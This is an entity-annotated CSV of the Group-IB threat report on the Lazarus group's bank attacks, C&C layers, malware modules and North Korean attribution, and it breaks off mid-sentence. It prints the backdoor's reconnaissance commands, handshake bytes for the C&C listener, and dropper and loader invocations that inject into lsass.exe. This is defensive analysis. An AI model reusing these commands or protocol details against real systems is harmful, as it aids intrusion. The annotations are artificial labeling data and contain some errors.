DocName,text,intent
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," 
ARISEN

ARCHITECTURE / TOOLS / ATTRIBUTION



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution2

INTRODUCTION

In ",O
Group-IB_Lazarus,February 2016,timestamp
Group-IB_Lazarus,", hackers reportedly attempted to steal approximately  
1 billion USD from the ",O
Group-IB_Lazarus,Central Bank of Bangladesh,org
Group-IB_Lazarus, through ,O
Group-IB_Lazarus,SWIFT,software
Group-IB_Lazarus,. In ,O
Group-IB_Lazarus,February 2017,timestamp
Group-IB_Lazarus,", several Polish ",O
Group-IB_Lazarus,banks,industry
Group-IB_Lazarus," were compromised.

Security researchers analysed the malware code, chiefly using this to attribute 
activity to ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," group. As tools are often reused by different groups, while 
helpful, malware analysis does not provide conclusive evidence of attribution.

",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus, researchers investigating ,O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," group collected a broad range 
of data, both technical and strategic, which places clear attribution on ",O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus,". The team detected and thoroughly analyzed multiple layers of C&C 
infrastructure used by ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," and have identified North Korean IP addresses 
from which the attacks were ultimately controlled. The following report is 
an overview of this group’s attack methodology for financial institutions, the 
malware employed and review of their targets.



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution3

Through analysis of ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," activity, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," gained deep insight on a 
complex botnet infrastructure built by the hacker group to conduct their 
attacks. To mask malicious activity, the hackers used a three-layer architecture 
of compromised servers with SSL encrypted channels established between 
them. In addition to encrypted traffic, data sent through SSL channel was 
additionally encrypted.  The attackers achieved anonymity by employing a 
legitimate VPN client - ",O
Group-IB_Lazarus,SoftEther VPN,tool
Group-IB_Lazarus,". In some cases, they also used corporate 
web servers that were part of the attacked infrastructure. 

To control infected machines, the hackers employed multi-module tools, 
attempting to complicate malware analysis. That said, they managed to 
conduct several successful attacks without employing 0day exploits. ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," 
demonstrated a flexible approach to attacks by applying different hacking tools, 
which prevented their detection by endpoint security solutions.

 
 
 

According to our investigation of the ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," infrastructure, the threat actors 
connected to the end C&C layer (Layer3) from two North Korean IP addresses 
",O
Group-IB_Lazarus,210.52.109.22,ioc
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,175.45.178.222,ioc
Group-IB_Lazarus,". The second IP-address relates to Potonggang 
District, perhaps coincidentally, where ",O
Group-IB_Lazarus,National Defence Commission,org
Group-IB_Lazarus,North Korea,O
Group-IB_Lazarus,"

Additional evidence was confirmed that ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," links to North Korean hackers 
by ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists through analysis of pubic sources. We found a news 
report from a South Korean ",O
Group-IB_Lazarus,Arirang,org
Group-IB_Lazarus," TV agency, dated ",O
Group-IB_Lazarus,2016,timestamp
Group-IB_Lazarus,", about an attack on 
South Korean television stations and ",O
Group-IB_Lazarus,banks,industry
Group-IB_Lazarus, as part of ,O
Group-IB_Lazarus,DarkSeoul,threat_actor
Group-IB_Lazarus," operation.  This 
attack performed by North Korean hackers and was investigated by the ",O
Group-IB_Lazarus,South Korea’s National Police Agency,org
Group-IB_Lazarus,", who detected two IP addresses ",O
Group-IB_Lazarus,175.45.178.19,ioc
Group-IB_Lazarus," and 
",O
Group-IB_Lazarus,175.45.178.97,ioc
Group-IB_Lazarus,", used by hackers to control malware. Both IP addresses are in the 
same block of IP addresses the IP ",O
Group-IB_Lazarus,175.45.178.222,ioc
Group-IB_Lazarus,", which was discovered by  
",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists.

KEY  
FINDINGS

01

Unique tools  
and C&C infrastructure 

Links to  
",O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus,"

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 

",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus, is purportedly controlled by ,O
Group-IB_Lazarus,Bureau 121,org
Group-IB_Lazarus,", a division of the 
",O
Group-IB_Lazarus,Reconnaissance General Bureau,org
Group-IB_Lazarus,", a ",O
Group-IB_Lazarus,North Korean intelligence agency,org
Group-IB_Lazarus,".  
",O
Group-IB_Lazarus,Bureau 121,org
Group-IB_Lazarus," is responsible for conducting military cyber campaigns.



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution4

",O
Group-IB_Lazarus,Since 2016,timestamp
Group-IB_Lazarus,", the hackers have tried to mask their activity by pretending to 
be Russian hackers. They added specific debugging symbols and strings 
containing Russian words to a new version of ",O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus,", a 
module designed to proxy network traffic. To protect their executables, 
they used ",O
Group-IB_Lazarus,Enigma Protector,tool
Group-IB_Lazarus,", a commercial product, which was created by a 
Russian software developer. They also used exploits for ",O
Group-IB_Lazarus,Flash,software
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,SilverLight,software
Group-IB_Lazarus," 
from sets of exploits created by Russian-speaking hackers.

These masquerade techniques did initially mislead some researchers who 
conducted express analysis of malicious code. 
 
 
 
A state-sponsored hacker group ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," managed to gain fraudulent 
access to the ",O
Group-IB_Lazarus,SWIFT,software
Group-IB_Lazarus, network of attacked ,O
Group-IB_Lazarus,banks,industry
Group-IB_Lazarus,". This is believed to be a 
growing trend: state-sponsored hackers are demonstrating an increased 
interest in conducting attacks on financial institutions, which are considered 
a component of the national critical infrastructure in some countries. At the 
moment, only a few similar incidents have been detected. For example, 
",O
Group-IB_Lazarus,IN 2010-2013,timestamp
Group-IB_Lazarus, the ,O
Group-IB_Lazarus,NSA,org
Group-IB_Lazarus, reportedly penetrated the ,O
Group-IB_Lazarus,SWIFT,software
Group-IB_Lazarus," banking network and 
monitored a number of ",O
Group-IB_Lazarus,Middle East,country
Group-IB_Lazarus, ,O
Group-IB_Lazarus,banks,industry
Group-IB_Lazarus,. In late ,O
Group-IB_Lazarus,2016,timestamp
Group-IB_Lazarus,", attacks on Ukrainian 
",O
Group-IB_Lazarus,banks,industry
Group-IB_Lazarus," were conducted, allegedly as part of the ",O
Group-IB_Lazarus,BlackEnergy,malware
Group-IB_Lazarus," operation. 
However, researchers expect that the number of attacks on financial 
institutions by state-backed hackers may significantly increase in the future. 
 
 
 
The earliest indicator of compromise detected by ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus,  is dated ,O
Group-IB_Lazarus,March 2016,timestamp
Group-IB_Lazarus,. This was directly after the ,O
Group-IB_Lazarus,Central Bank of Bangladesh,org
Group-IB_Lazarus," incident, 
which took place in ",O
Group-IB_Lazarus,February 2016,timestamp
Group-IB_Lazarus,", where attackers attempted to steal $1 
billion USD. Only a spelling mistake in an online bank transfer instruction 
helped prevent them from stealing more than $81 million USD. Following 
this incident, the group modified its tactics and tools, adapting them to the 
changing environment and misleading researchers.

Through analysis of compromised networks, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," identified IP addresses 
of universities in the ",O
Group-IB_Lazarus,US,country
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Canada,country
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Great Britain,country
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,India,country
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Bulgaria,country
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Poland,country
Group-IB_Lazarus,", 
",O
Group-IB_Lazarus,Turkey,country
Group-IB_Lazarus,", pharmaceutical companies in ",O
Group-IB_Lazarus,Japan,country
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,China,country
Group-IB_Lazarus,", as well as government 
subnets in various countries.

Emerging trend

Victims

Masquerading  
as Russian hackers 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution5

To infiltrate systems of their interest, ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus, conducted ,O
Group-IB_Lazarus,watering-hole,technique
Group-IB_Lazarus," attacks 
leveraging compromised resources often visited by their potential victims, 
such as websites of financial regulators and government agencies in several 
countries.   
 
Some of these resources are listed below: 

• knf.gov.pl — ",O
Group-IB_Lazarus,The Polish Financial Supervision Authority,org
Group-IB_Lazarus,"

• cnvb.gob.mx — ",O
Group-IB_Lazarus,National Banking and Securities Commission,org
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Mexico,country
Group-IB_Lazarus,"

• brou.com.uy —  ",O
Group-IB_Lazarus,Banco de la República Oriental del Uruguay,org
Group-IB_Lazarus,", a state-owned  
",O
Group-IB_Lazarus,bank,industry
Group-IB_Lazarus, in ,O
Group-IB_Lazarus,Uruguay,country
Group-IB_Lazarus,"

Through examination of a code on a web server with exploits, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists detected a list of 255 IP address ranges. That said, hackers 
infected only those users who visited the website from a computer within the 
specified IP range. Based on this list, researchers have compiled a map of the 
countries that were of interest to the attackers, which is presented below.

ATTACK 
PREPARATION AND 
IMPLEMENTATION

2.1  Infection  
of web resources

02 To conduct attacks, the criminals 
developed toolsets to control C&C 
servers and infected machines, built 
a three-layer C&C infrastructure, 
and compromised dozens of large 
web resources.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution6

To gain access to websites of ",O
Group-IB_Lazarus,financial,industry
Group-IB_Lazarus, regulators and ,O
Group-IB_Lazarus,bank,industry
Group-IB_Lazarus," local networks, 
hackers used known vulnerabilities in ",O
Group-IB_Lazarus,JBoss,software
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,Liferay,software
Group-IB_Lazarus,". They compiled an 
exploit for ",O
Group-IB_Lazarus,SilverLight,software
Group-IB_Lazarus, ,O
Group-IB_Lazarus,CVE-2016-0034,O
Group-IB_Lazarus," (MS16-006) which earlier was included 
into ",O
Group-IB_Lazarus,RIG,malware
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,Angler,malware
Group-IB_Lazarus," exploit kits, they also used ",O
Group-IB_Lazarus,Flash exploits,malware
Group-IB_Lazarus, from ,O
Group-IB_Lazarus,Neutrino Exploit Kit,malware
Group-IB_Lazarus,".

 
 
 
 
Attackers created a 3-tier infrastructure that consisted of compromised 
servers, between which the hackers established SSL encrypted channels. The 
network interaction with the attacked computer was carried out only from the 
Layer 1 server, which acted as a C&C server. In some cases, hackers placed the 
Layer 1 server inside the organization attacked in order to reduce the risk of 
detection. They gained access to these servers by brute forcing passwords for 
RDP. 

Hackers used original set of tools:

 
Through in-depth analysis of the tools used by the attackers, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," 
specialists identified the scheme of communications between nodes within 
the C&C infrastructure.

2.2  Establishment of C&C 
infrastructure:  

",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus," Used to manage windows-based server infrastructure

Server_TrafficForwarder Forwards traffic from one external server to another  

Backend_ Listener Establishes connection with servers with installed Server_
RAT, gets commands directly from the threat actor

",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus," Admin tool to send commands to infected computers

",O
Group-IB_Lazarus,SWIFT,software
Group-IB_Lazarus, toolbox Used to work with ,O
Group-IB_Lazarus,SWIFT,software
Group-IB_Lazarus,", consists of Alliance software 
Hook Files and ",O
Group-IB_Lazarus,SWIFT,software
Group-IB_Lazarus," transactions Information 
Harvester.



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution7

",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus," was installed on all infrastructure levels to control the 
compromised infrastructure 
 
",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus," constantly listens on port 3365, to which attackers connected 
to control the server. To ensure the availability of the specified port, 
the malicious program added a special rule to the firewall that allowed 
incoming connections to this port. Infected computers performed an 
outgoing connection to the compromised server acting as proxy via port 
443. Typically outbound connections on this port are allowed in corporate 
networks.

Based on analysis of the ",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus," functionality, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists 
identified that ",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus," responds to certain requests in a specific way. 
Keeping in mind that ",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus," constantly keeps port 3365 open, we 
scanned the Internet for open ports 3365. Following this, we checked a 
list of detected servers to identify those servers where ",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus," was 
installed. As a result, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists received a list of 74 IP addresses, 
which are presented in the Indicators of Compromise section.

Server_TrafficForwarder was installed on the first and second server level 
— this module redirected traffic from one server to another.  
 
In some cases, Server_TrafficForwarder was installed on servers inside the 
attacked organization. This approach allows the criminal to avoid detection 
of suspicious connections to the external network or bypass network 
connection restrictions with prohibited connections to the external network 
from specific computers/servers, which is often applied by companies to 
protect the most critical PCs, such as those of ",O
Group-IB_Lazarus,SWIFT,software
Group-IB_Lazarus," operators. 

Three-layer C&C server infrastructure

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution8

After the start, Server_TrafficForwarder reads the contents of the key and 
certificate files from the root directory that will be used to create an SSL 
tunnel. That said, the file does not contain any information about the servers 
to which traffic should be transferred. At the first start, hackers manually 
specify the port to listen on as well as the address of the C&C server to 
which traffic is to be sent. In the event the port is not specified, the program 
listens on a random port and waits for incoming connections. 

To verify communication with a compromised server, hackers check if the 
client is appropriate: they send the first network request; when a response 
is received from the client, they decrypt it and compare with a previously 
known response. In the event the responses are different, the connection is 
broken. 

The table below contains all commands available:

The only difference in the Server_TrafficForwarder configuration on Layer 
1 and Layer 2 servers respectively is that Server_TrafficForwarder installed 
on Layer 1 accepts traffic from port 443 and forwards it on the same port 
of Layer 2. While Layer 2 accepts traffic on port 443 and forwards it to port 
8080 of Layer 3.

Commands Description

0x1095 -

0x1096 Collects and sends system 
information

0x10AA Gets the configuration

0x10AB Changes the configuration 
(including the port on which 
it listens for connections)

0x10AE -

0x10AF -

0x10B3 Reads a private key file and 
sends it to the operator

0x10B4 Records data to a file

Commands Description

NONE -

GINF Collects and sends system 
information

GCFG Gets the configuration 

SCFG Changes the configuration 
(including the port on which 
it listens connections) 

SLEP -

HIBN -

LCLR Records data to a file

LDWN Reads a private key file and 
sends it to the operator

Commands of the first version: Commands of the second version:



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution9

To encrypt all of its network connections, the traffic forwarder uses the 
statically linked wolfSSL libraries and SSL certificates which are generated 
by a pre-defined template. The “Issued for“ field always contains a third-level 
domain slash an email address.  

A few examples are shown below: 

• www.resfinan.com/emailAddress=info@resfinan.com

• finews.otzo.com/emailAddress=master@otzo.com

• host.global.com/emailAddress=info@host.global.com

• latest.ignorelist.com/emailAddress=consult@latest.ignorelist.com 

With information about this template, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists managed to detect 
similar certificates and associated hosts. With these indicators, you can check 
if your organization was, or is, under attack by ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus,".

 
",O
Group-IB_Lazarus,Backend_Listenerr,malware
Group-IB_Lazarus," is software installed by attackers on Layer 3 servers. The 
program performs communications with other servers, receives commands 
from the administrator and sends them in chain order to the end infected 
computer. 

",O
Group-IB_Lazarus,Backend_Listenerr,malware
Group-IB_Lazarus," listens on the two ports:

• port 8080, to which it accepts SSL connections from Layer 2 servers.

• port 9090, to which it accepts connections from the control system 
(",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus,"). 

To encrypt traffic, the wolfSSL open source library is used. After the 
application is launched, the private key and certificate files are loaded from 
the root directory. These files are used to encrypt traffic between the C&C 
server and connected clients.

To defend against security solutions designed to “unpack” SSL encrypted 
traffic, ",O
Group-IB_Lazarus,Backend_Listenerr,malware
Group-IB_Lazarus," encrypts all data sent over an SSL channel using an 
additional reversible encryption algorithm and performs legitimacy checks.  

To reverse-engineer the protocol of server communications with clients, 
",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists have developed a client that successfully connects to 
both above-mentioned ports.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution10

This allowed us to analyze communications between the Admin-Tool and 
",O
Group-IB_Lazarus,Backend_Listenerr,malware
Group-IB_Lazarus," and we discovered that: 

",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus," must have an key pair that is identical to the server 

",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus," sends a customized Hello-package that differs from the one 
that is provided by the library. By default this package (msg) is specified in 
the library as follows: 

 
",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus," sends an encrypted (special) packet with a length from the 
previous packet (len). 

The server decrypts the contents of the packet sent.After decryption, the 
following conditions must be true:

3

4

static unsigned char msg[4] = { 0x11, 0x00, 0x00, 0x00, };
static unsigned char ecnrypted_str[17] = { 0x38, 0x94, 0x3C, 0x6A, 0x58, 0x39, 
0x1A, 0x56, 0x81, 0x4B, 0x09, 0x99, 0x1D, 0xE0, 0xCF, 0x81, 0x3F };

(DWORD)&decrypted_buff[5] == len 
(DWORD)&decrypted_buff[15] == len

where len is the length of the packet

1

2

The correct Hello packet that will be accepted by ",O
Group-IB_Lazarus,Backend_Listener,malware
Group-IB_Lazarus," must be of the 
following form:

 
In fact, this is an information packet, rather than a Hello packet, and its first byte 
contains the length of the next packet sent («len»), while the rest bytes must be zero 
in this case.

#ifndef WOLFSSL_ALT_TEST_STRINGS
char msg[32] = «hello wolfssl!»;   /* GET may make bigger */

static unsigned char msg[4] = { 0x11, 0x00, 0x00, 0x00, };



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution11

",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus,  sends DWORD with len2 ,O
Group-IB_Lazarus,<,O
Group-IB_Lazarus," 201 where len2 is the length of the 
next package.  

",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus," sends encrypted (special) package #2. It’s length is determined 
in the previous package. 

Server decrypts the content of the package, and the following rules should 
work there after decryption: 

VPN: the attackers installed ",O
Group-IB_Lazarus,SoftEther VPN,tool
Group-IB_Lazarus," (http://softether.net/) service 
supported by ",O
Group-IB_Lazarus,University of Tsukuba,org
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Japan,country
Group-IB_Lazarus," on some servers to unsure 
additional level of anonymity. 

",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," have chosen this service for the following reasons:

• This legitimate application isn’t detected by security solutions 

• It can establish VPN connection via ICMP or DNS to avoid detection by network 
security solutions 

• It contains Dynamic DNS function, which means that if a compromised system has 
a dynamic IP address, the attacker can always find it by DNS name connected to 
the VPN client 

• This VPN client supports ",O
Group-IB_Lazarus,Windows,software
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Linux,software
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,FreeBSD,software
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Solaris,software
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Mac OS X,software
Group-IB_Lazarus,"

6

7

static unsigned char ecnrypted_str[17] = {  
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 

    0xC8, 0x88, 0xE0, 0xE4, 0x94, 0x85, 0xCC, 0xD1, 0x03, 0x00, 

(DWORD)&decrypted_buff[4] == 0xD1CC8594  
(DWORD)&decrypted_buff[8] == 3

Only if all validity checks are made, the traffic is forwarded from one port to another in 2 
streams. Following this, when the client connects to the first port (8080), the service will 
forward the traffic from the first port to the second one, and back.

The operators connected to port 9090 of Layer 3 servers from the following IP 
addresses: 

- ",O
Group-IB_Lazarus,210.52.109.22,ioc
Group-IB_Lazarus, (,O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus,")

- ",O
Group-IB_Lazarus,175.45.178.222,ioc
Group-IB_Lazarus, (,O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus,")

- ",O
Group-IB_Lazarus,157.7.135.182,ioc
Group-IB_Lazarus, (,O
Group-IB_Lazarus,Japan,country
Group-IB_Lazarus,) and ,O
Group-IB_Lazarus,202.101.36.45,ioc
Group-IB_Lazarus, (,O
Group-IB_Lazarus,China,country
Group-IB_Lazarus,) - via ,O
Group-IB_Lazarus,SoftEther VPN,tool
Group-IB_Lazarus,"

5

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution12

In addition to multi-layer server structure, hackers developed a specialized 
toolset to perform remote control over infected PCs.

The group actively attempted to conceal their activity, complicating malware 
detection and analysis as much as possible. All tools consist of modules, which 
were delivered separately to target organizations only. To complicate malware 
investigation, criminals encrypted and obfuscated their tools.

Modular architecture of the victim’s infection process provides both additional 
flexibility and anonymity throughout the cyber-attack. This scheme allows 
hackers to divide software development activity between teams, as well as to 
ensure the reuse of program code.

",O
Group-IB_Lazarus,RECON,malware
Group-IB_Lazarus," is a backdoor that is initially installed on the target machine through 
successful execution of exploits. This module is used by hackers to perform 
initial reconnaissance to search for systems of interest. 

Once launched, the program adds itself to the auto-start by copying its file 
to the directory ""%USERPROFILE%\AppData\Roaming\Microsoft\Windows\
Start Menu\Programs\Startup"", collects data about the system and network 
environment and sends them to the C&C server. 

2.3  Tools to control infected PCs 

cmd.exe /c hostname
cmd.exe /c whoami
cmd.exe /c ver
cmd.exe /c ipconfig -all
cmd.exe /c ping www.google.com
cmd.exe /c query user
cmd.exe /c net user
cmd.exe /c net view
cmd.exe /c net view /domain
cmd.exe /c reg query «HKCU\SOFTWARE\Microsoft\Windows\
CurrentVersion\Internet Settings»
cmd.exe /c tasklist /svc
cmd.exe /c netstat -ano | find «TCP»

Below is a list of data collected:

",O
Group-IB_Lazarus,RECON,malware
Group-IB_Lazarus," Performs initial reconnaissance to determine if a systems is of 
interest to the threat actors

",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus, Extracts and decrypts ,O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus, Decrypts the payload — ,O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus, or ,O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus," 
— and injects into the legitimate process

",O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus," Forwards operator’s commands from external network into 
corporate network

",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus," Provides full control over the target system



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution13

In the event the system is not of interest, the module will use the ""killkill"" 
command to remove itself from the infected system. If the system is of interest, 
then ",O
Group-IB_Lazarus,RECON,malware
Group-IB_Lazarus, downloads ,O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus, using the “http” command. ,O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus," will then 
install ",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus," to the infected system as follows: 

",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus, extracts and decrypts ,O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus,", embeds it into the system and 
extracts ",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,".

To decrypt the configuration file, ",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus," needs MD5 encryption key, which 
only the attacker knows.

",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus, specialists have analyzed two versions of ,O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus,". There are no 
fundamental differences between them: both versions were used to decrypt 
the loader and encrypted payload, as well as to ensure loader persistence in 
the system.

Arguments Description

dropper.exe -l Enumerates system 
services

dropper.exe  -e 
[path]

Retrieves and decrypts 
encrypted payload and 
saves it to the specified file

dropper.exe –a 
[service name] 
[path to DLL]

Installs the library as a 
service

Arguments Description

dropper.exe -x 
[key] -l

Enumerates system services

dropper.exe 
-x [key] -e 
[servicename] 
[config]

Extracts and decrypts the payload 
from config and sets it as a service

dropper.exe -x 
[key] -f

Installs implants by adding 
information about them to the 
system registry

dropper.exe 
-x [key] -o 
[eventname]

Calls OpenEventA with a special 
event name

dropper.exe 
-x [key] -t 

Calls OpenEventA with a special 
event name, then calls Setvent API

Commands of the first version:

Version 1 Version 2

In addition, ",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus," can read executable data from registry keys and embed 
them in the selected process. The executable data is read from the following 
registry keys:

• HKLM\SYSTEM\CurrentControlSet\Services\",O
Group-IB_Lazarus,"\Security\Data2

• HKLM\SYSTEM\CurrentControlSet\Services\",O
Group-IB_Lazarus,"\Security\Data3

Commands of the second version

",O
Group-IB_Lazarus,RECON,malware
Group-IB_Lazarus,"

СИСТЕМНЫЕ 
ПРОЦЕССЫ

",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus," decrypts 
and embeds ",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus,"
extracts decrypted 
",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus," decrypts 
and embeds 
",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,RECON,malware
Group-IB_Lazarus," decrypts 
and embeds 
",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus,"

2 31

встраивание 
в систему

встраивание 
в систему

встраивание 
в систему

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution14

",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus, is used to decrypt the payload — ,O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus, or ,O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus," 
— and inject it into the legitimate process (for example, in lsass.exe)

Hackers manually specify the C&C server at the time when the main program 
is started. That’s why even if researchers detect the loader they cannot 
identify where the C&C server is located, by whom it is controlled, and which 
port is used for connection. In some cases, an additional loader was used by 
criminals.  

Example of loader launch:   

",O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus,"

This module was installed on one of the PCs in the internal network of the 
attacked organization. It proxies traffic from C&C server to PCs in the local 
network of the attacked organization.

",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,"

The ",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus," program provides full control over the target system: it allows 
you to analyze the system, download and execute files, transfer data from the 
infected computer to the C&C server.

Communications with the C&C server are performed over an encrypted SSL 
channel. For this purpose, ",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus," uses statically linked libcurl libraries, 
version 7.47.1 (",O
Group-IB_Lazarus,FEB 2016,timestamp
Group-IB_Lazarus,").

loader.exe -d «encrypted_payload.bin» -p 1540 -s [encrypted_C&C:port] -r [encrypted_commands]

Argument -d:
Name of the file  

where Client _Rat or  
Client_Forwarder are stored 

in encrypted form

Argument -p:
ID of the process (for example, lsass.

exe) in which the payload –  ",O
